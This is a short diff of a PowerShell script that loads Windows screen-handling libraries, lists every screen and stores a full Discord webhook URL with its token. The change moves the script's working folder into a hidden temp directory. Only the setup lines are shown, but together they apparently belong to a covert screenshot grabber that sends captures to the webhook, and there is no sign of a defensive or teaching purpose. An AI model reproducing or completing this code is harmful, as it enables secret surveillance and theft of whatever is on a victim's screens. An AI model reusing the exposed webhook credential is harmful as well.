@@ -1,5 +1,5 @@
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-$location = pwd
+$location = "$env:temp\sad"
 $screens = [Windows.Forms.Screen]::AllScreens
 $link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
 
